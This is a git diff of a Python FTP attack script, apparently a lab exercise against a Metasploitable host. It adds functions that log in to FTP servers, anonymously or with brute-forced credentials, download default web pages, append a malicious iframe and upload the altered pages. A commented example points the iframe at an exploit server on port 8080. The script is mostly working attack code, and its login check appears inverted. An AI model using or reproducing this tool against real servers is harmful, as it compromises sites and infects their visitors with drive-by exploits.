@@ -2,6 +2,7 @@
 # we will use anoLogin() takes in arg (hostname) and returns bool that describes the availability of anonymous logins
 
 import ftplib
+from optparse import OptionParser
 
 # checking the anonymous logins
 def anonLogin(hostname):
@@ -47,7 +48,7 @@ def bruteLogin(hostname, passwdFile):
 def returnDefault(ftp):
     print(f"[+] Analyzing a vulnerable FTP server")
     try:
-        ftp.cwd('/var/www')
+        ftp.cwd('/var/www/twiki')
         # nlst lists the directory content
         # nlst checks each file returned by the nlst agaisnt default web page file names
         dirList = ftp.nlst()
@@ -69,9 +70,118 @@ def returnDefault(ftp):
     return retList
 
 
+#  ftp connection
+# the page grabbed
+# redirect iframe string
+def injectPage(ftp, page, redirect):
+    try:
+        f = open(page + '.tmp', 'w')
+        ftp.retrlines('RETR ' + page, f.write)
+        print("[+] Downloaded Page: " + page)
+        # adding the redirect ?
+        f.write(redirect)
+        f.close()
+        print("[+] Injected Malicious Iframe on: " + page)
+        ftp.storlines('STOR ' + page, open(page + '.tmp'))
+        print("[+] Uploaded Injected Page: " + page)
 
-host = '192.168.52.128'
+    except Exception as e:
+        print(f"[!!] Error: {e}")
+
+
+
+
+# combining everything except bruteforcing and anologin
+def attack(username, password, tgtHost, redirect):
+    ftp = ftplib.FTP(tgtHost)
+    ftp.login(username,password)
+    defpages = returnDefault(ftp)
+    for defpage in defpages:
+        injectPage(ftp, defpage, redirect)
+
+
+
+
+def main():
+    parser = OptionParser('usage %prog -H <target hosts> -r <redirect page> -f userpass file')
+    parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
+    parser.add_option('-f', dest='passwdfile', type='string', help='specify user:pass file')
+    parser.add_option('-r', dest='redirect', type='string', help='specify redirection page')
+    (option, args) = parser.parse_args()
+    tgtHosts = str(option.tgtHosts).split(", ")
+    passwdfile = option.passwdfile
+    redirect = option.redirect
+    if tgtHosts == None or redirect == None:
+        print(parser.usage)
+        exit(0)
+
+    for tgtHost in tgtHosts:
+        username = None
+        password = None
+        if anonLogin(tgtHost) == False:
+            username = 'anonymous'
+            password = 'me@your.com'
+            print("[+] Using Anonymous Creds to attack")
+            attack(username, password, tgtHost, redirect)
+        elif passwdfile != None:
+            (username, password) = bruteLogin(tgtHost, passwdfile)
+            if password != None:
+                print(F"[+] Using Credential {username}:{password} to attack")
+                attack(username, password, tgtHost, redirect)
+
+
+if __name__ == '__main__':
+    main()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+"""
+# ip address of msfadmin
+host = "192.168.52.128"
 username, password = bruteLogin(host, 'userpass.txt')
 ftp = ftplib.FTP(host)
 ftp.login(username, password)
 returnDefault(ftp)
+redirect = '<iframe src="http://192.168.52.129:8080/exploit"></iframe>'
+injectPage(ftp, 'index.html', redirect)
+"""
